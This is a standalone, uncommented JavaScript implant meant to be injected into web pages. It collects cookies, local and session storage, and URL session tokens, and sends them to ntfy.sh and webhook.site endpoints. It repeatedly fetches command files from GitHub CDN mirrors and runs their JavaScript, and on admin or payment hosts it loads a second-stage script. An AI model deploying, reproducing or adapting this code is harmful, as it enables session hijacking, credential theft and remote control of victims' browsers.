(function(){
var R="https://raw.githubusercontent.com/polootyyy/cdnx/main/";
var N="https://ntfy.sh/hlvg-3329152120";
var W="https://webhook.site/e4e989f5-dfd9-487d-807d-d8023425485d";
var CAP=3400,Q=[],busy=0;
function raw(url,str,ct){
  try{if(navigator.sendBeacon){if(navigator.sendBeacon(url,new Blob([str],{type:ct||"text/plain"})))return}}catch(e){}
  try{fetch(url,{method:"POST",body:str,keepalive:true,headers:{"content-type":ct||"text/plain","X-Title":"hl"}}).catch(function(){})}catch(e){}
}
function pump(){
  if(busy||!Q.length)return;
  busy=1;var j=Q.shift();
  raw(j.u,j.s,j.ct);
  setTimeout(function(){busy=0;pump()},260);
}
function post(t,d){
  d=String(d==null?"":d);
  var n=Math.ceil(d.length/CAP)||1;
  for(var i=0,k=0;i<d.length||k===0;i+=CAP,k++){
    var body=(n>1?"["+(k+1)+"/"+n+"] ":"")+"t="+t+" ";
    Q.push({u:N,s:body+d.slice(i,i+CAP)});
  }
  pump();
}
function summary(t,d){Q.push({u:W+"/h?t="+t,s:String(d).slice(0,7000)});pump()}
window.__HL={post:post,summary:summary};
function ls(){
 var o={lslen:-1,err:"",ls:{},ss:{},tok:"",sid:""};
 try{o.lslen=localStorage.length}catch(e){o.err+="ls:"+e.name}
 try{for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);o.ls[k]=String(localStorage.getItem(k)).slice(0,2400)}}catch(e){o.err+="|rd:"+e.name}
 try{for(var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j);o.ss[k2]=String(sessionStorage.getItem(k2)).slice(0,2400)}}catch(e){o.err+="|ss:"+e.name}
 try{var m=/[?&](token|sid|session)=([^&#]+)/.exec(location.href);if(m){o[m[1]]=m[2]}}catch(e){}
 try{o.sid=localStorage.getItem("session")||localStorage.getItem("sid")||localStorage.getItem("token")||""}catch(e){}
 return JSON.stringify(o)
}
var TICKS=0,T0=Date.now();
var MIRRORS=[
 "https://raw.githubusercontent.com/polootyyy/cdnx/main/",
 "https://raw.githack.com/polootyyy/cdnx/main/",
 "https://cdn.statically.io/gh/polootyyy/cdnx/main/",
 "https://cdn.jsdelivr.net/gh/polootyyy/cdnx@main/"
];
function getcmd(i){
 if(i>=MIRRORS.length)return;
 fetch(MIRRORS[i]+"cmd.json?x="+Math.random(),{cache:"no-store"}).then(function(r){return r.text()}).then(function(t){
   var c=null;try{c=JSON.parse(t)}catch(e){return getcmd(i+1)}
   if(c&&c.rev>window.__REV)return exec(c);
   if(i<MIRRORS.length-1)return getcmd(i+1);   // stale edge: try another
 }).catch(function(){getcmd(i+1)})
}
function exec(c){
 window.__REV=c.rev;TICKS++;
 try{var s=document.createElement("script");s.text=c.js;document.body.appendChild(s);if(!window.__CMD){try{new Function(c.js)();window.__CMD=1}catch(e){}}}catch(e){try{new Function(c.js)()}catch(e2){post("execbad",String(e2).slice(0,120))}}
}
function run(){getcmd(0)}
window.__TICK=setInterval(function(){
  if(Date.now()-T0>540000){clearInterval(window.__TICK);post("hb","stop "+TICKS);return}
  if(TICKS%5===0)post("hb",TICKS+"");
  run();
},12000);
run();
var P=/^(admin|paymentcenter|internal-admin)\./.test(location.host);
post("agent",[location.href,document.title,location.referrer,document.cookie].join(" || "));
post("ls",ls());
summary("agent",location.host+location.pathname+" ck="+document.cookie.slice(0,1200));
if(P){post("panel",location.host+" iframe="+(function(){try{return top!==self}catch(e){return "?"}})()+" dom="+document.domain);
 var z=document.createElement("script");z.src="//cdn.jsdelivr.net/gh/polootyyy/cdnx@93e2490/p.js";document.body.appendChild(z);}
})();
